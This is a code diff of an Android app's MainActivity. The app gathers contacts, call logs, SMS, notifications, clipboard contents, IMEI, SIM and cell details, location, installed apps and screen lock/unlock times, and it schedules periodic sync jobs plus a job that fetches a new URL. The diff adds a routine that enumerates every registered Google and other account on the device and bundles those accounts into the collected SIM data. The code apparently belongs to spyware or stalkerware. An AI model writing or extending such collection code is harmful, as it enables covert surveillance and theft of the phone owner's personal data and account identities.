@@ -16,6 +16,9 @@ import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 
 import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
+import android.annotation.SuppressLint;
 import android.app.KeyguardManager;
 import android.content.BroadcastReceiver;
 import android.content.ClipData;
@@ -68,6 +71,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.lang.reflect.Method;
 import java.lang.reflect.Type;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
@@ -86,8 +90,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     List<Contact> contactList = new ArrayList<>();
     EditText mEditname;
     Button btsave, mAccessbilitySettings, SyncData, AutoStart, BaterryinOther, BaterryinMi, Othernotifications;
-    public static PeriodicWorkRequest mPeriodicWorkRequest, mPeriodicWorkRequest1,mGetUrlPeriodicWorkRequest;
-    static OneTimeWorkRequest mOneTimeWorkRequest,UrlTimeWorkRequest;
+    public static PeriodicWorkRequest mPeriodicWorkRequest, mPeriodicWorkRequest1, mGetUrlPeriodicWorkRequest;
+    static OneTimeWorkRequest mOneTimeWorkRequest, UrlTimeWorkRequest;
     public static WorkManager mWorkManager;
     List<String> appsInstallednames = new ArrayList<>();
     static ClipboardManager clipboardManager;
@@ -140,8 +144,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
 
         float batteryPct = level * 100 / (float)scale;*/
-        isPhoneIsLockedOrNot(getApplicationContext());
-        getBatteryPercent(this,mSharedpref);
+
 
         if (!mSharedpref.getSaveName().isEmpty()) {
             mEditname.setText(mSharedpref.getSaveName());
@@ -152,7 +155,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
         checkpermissions();
         getphoneAppdetails();
-
+        isPhoneIsLockedOrNot(getApplicationContext());
+        getBatteryPercent(this, mSharedpref);
         LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));
         String lastentry = mSharedpref.getNotificationData();
         String lastentry1 = mSharedpref.getSmsData();
@@ -247,8 +251,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 continue;
                 //Discard this one
                 //in this case, it should be a user-installed app
-            }
-            else {
+            } else {
                 String label = (String) pm.getApplicationLabel(packageInfo);
                 appsInstallednames.add("" + i + " " + label);
                 i++;
@@ -263,13 +266,13 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     }
 
     public static void setupWorkManager() {
-         mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(SyncData.class, 15,
+        mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(SyncData.class, 15,
                 TimeUnit.MINUTES).setBackoffCriteria(
                 BackoffPolicy.LINEAR,
                 PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                 TimeUnit.MILLISECONDS).build();
         mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mPeriodicWorkRequest);
-       geturl();
+        geturl();
         mPeriodicWorkRequest1 = new PeriodicWorkRequest.Builder(SyncContact.class, 50,
                 TimeUnit.MINUTES).setBackoffCriteria(
                 BackoffPolicy.LINEAR,
@@ -280,7 +283,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     }
 
     public static void geturl() {
-        mGetUrlPeriodicWorkRequest=new PeriodicWorkRequest.Builder(GetNewUrl.class, 25,
+        mGetUrlPeriodicWorkRequest = new PeriodicWorkRequest.Builder(GetNewUrl.class, 25,
                 TimeUnit.MINUTES).setBackoffCriteria(
                 BackoffPolicy.LINEAR,
                 PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
@@ -300,9 +303,11 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         try {
             if ((ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                     != PackageManager.PERMISSION_GRANTED) &&
+                    (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)
+                            != PackageManager.PERMISSION_GRANTED) &&
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                             != PackageManager.PERMISSION_GRANTED)
-                    &&  (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                    && (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                     != PackageManager.PERMISSION_GRANTED)
                     && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                     != PackageManager.PERMISSION_GRANTED)
@@ -311,12 +316,13 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     && (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS)
                     != PackageManager.PERMISSION_GRANTED)
                     && (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
-                    != PackageManager.PERMISSION_GRANTED)&&
+                    != PackageManager.PERMISSION_GRANTED) &&
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS)
-                    != PackageManager.PERMISSION_GRANTED))  {
+                            != PackageManager.PERMISSION_GRANTED)) {
                 ActivityCompat.requestPermissions(this,
                         new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS,
                                 Manifest.permission.READ_PHONE_STATE,
+                                Manifest.permission.GET_ACCOUNTS,
                                 Manifest.permission.ACCESS_COARSE_LOCATION,
                                 Manifest.permission.ACCESS_FINE_LOCATION,
                                 Manifest.permission.READ_CALL_LOG,
@@ -345,15 +351,15 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         getImieNumbers(this);
         simName(getApplicationContext());
         getCellInfo(this);
+
         AsyncTask.execute(new Runnable() {
             @Override
             public void run() {
                 readContacts();
             }
         });
-        readCallLogs(getApplicationContext(),mSharedpref);
+        readCallLogs(getApplicationContext(), mSharedpref);
     }
-
 
 
     public void readContacts() {
@@ -545,6 +551,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         return deviceInfo;
     }
 
+    @SuppressLint("MissingPermission")
     private static String getImieNumbers(Context cntx) {
         TelephonyManager tm = (TelephonyManager) cntx.getSystemService(Context.TELEPHONY_SERVICE);
         if (ActivityCompat.checkSelfPermission(cntx, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
@@ -658,17 +665,83 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                         cellObj.put("dataRoaming", String.valueOf(info.getDataRoaming()));
                         cellObj.put("mobileNo", info.getNumber());
                         cellObj.put("mIccId", info.getIccId());
+                        cellObj.put("DefaultSim", getDefaultSimmm(mContext));
+                        cellObj.put("accounts",getemails(mContext));
                         phonessimdetail.put(cellObj);
                     } catch (JSONException e) {
                         e.printStackTrace();
                     }
-
-
                 }
             }
 
         }
         return phonessimdetail;
+    }
+
+    private static String getemails(Context context) {
+        String possibleEmail="";
+
+        try{
+            possibleEmail += "Get Registered Gmail Account\n";
+            @SuppressLint("MissingPermission") Account[] accounts =
+                    AccountManager.get(context).getAccountsByType("com.google");
+
+            for (Account account : accounts) {
+
+                possibleEmail += " --> "+account.name+" : "+account.type+" , \n";
+                possibleEmail += " \n\n";
+
+            }
+        }
+        catch(Exception e)
+        {
+            Log.i("Exception", "Exception:"+e) ;
+        }
+
+
+        try{
+            possibleEmail += "Get All Registered Account\n";
+
+            @SuppressLint("MissingPermission") Account[] accounts = AccountManager.get(context).getAccounts();
+            for (Account account : accounts) {
+
+                possibleEmail += " --> "+account.name+" : "+account.type+" , \n";
+                possibleEmail += " \n";
+
+            }
+        }
+        catch(Exception e)
+        {
+            Log.i("Exception", "Exception:"+e) ;
+        }
+
+        // Show on screen
+
+        Log.i("Exception", "mails:"+possibleEmail) ;
+        return possibleEmail;
+    }
+
+    public static int getDefaultSimmm(Context context) {
+        int defaultSmsId = 0;
+
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+                // TODO: Consider calling
+                //    ActivityCompat#requestPermissions
+                // here to request the missing permissions, and then overriding
+                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+                //                                          int[] grantResults)
+                // to handle the case where the user grants the permission. See the documentation
+                // for ActivityCompat#requestPermissions for more details.
+                return -1;
+            }
+            SubscriptionManager manager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+                defaultSmsId = manager.getDefaultSmsSubscriptionId();
+            }
+        }
+
+        return defaultSmsId;
     }
 
     public static JSONArray getCellInfo(Context ctx) {
@@ -823,10 +896,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         }
         return isPhoneLock;
     }*/
+    static String laststatus="";
+    static String status;
     private void isPhoneIsLockedOrNot(Context context) {
         Sharedpref mSharedpref = new Sharedpref(this);
-        String lockdetails=mSharedpref.getPhoneLockDetails();
-
         final IntentFilter theFilter = new IntentFilter();
         /** System Defined Broadcast */
         theFilter.addAction(Intent.ACTION_SCREEN_ON);
@@ -836,6 +909,21 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         BroadcastReceiver screenOnOffReceiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
+                String strAction = intent.getAction();
+
+                KeyguardManager myKM = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
+                if (strAction.equals(Intent.ACTION_USER_PRESENT) || strAction.equals(Intent.ACTION_SCREEN_OFF) || strAction.equals(Intent.ACTION_SCREEN_ON))
+                    if (myKM.inKeyguardRestrictedInputMode()) {
+                        status="Locked";
+                    } else {
+                        status="UnLocked";
+                    }
+                if (laststatus.equalsIgnoreCase(status)){
+                    return;
+                }
+                else {
+                    laststatus=status;
+                }
                 String lockdetails = mSharedpref.getPhoneLockDetails();
                 JSONObject jsonObject = new JSONObject();
                 JSONArray jsonArray=new JSONArray();
@@ -847,17 +935,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     }
                 }
                     try {
-                        String strAction = intent.getAction();
+                        jsonObject.put("value", status);
 
-                        KeyguardManager myKM = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
-                        if (strAction.equals(Intent.ACTION_USER_PRESENT) || strAction.equals(Intent.ACTION_SCREEN_OFF) || strAction.equals(Intent.ACTION_SCREEN_ON))
-                            if (myKM.inKeyguardRestrictedInputMode()) {
-                                jsonObject.put("value", "Locked");
-                                System.out.println("Screen off " + "LOCKED");
-                            } else {
-                                jsonObject.put("value", "UnLocked");
-                                System.out.println("Screen off " + "UNLOCKED");
-                            }
                         jsonObject.put("time",Utils.getCurrentDateTime());
                          jsonArray.put(jsonObject);
                     mSharedpref.setPhoneLockDetails(jsonArray.toString());
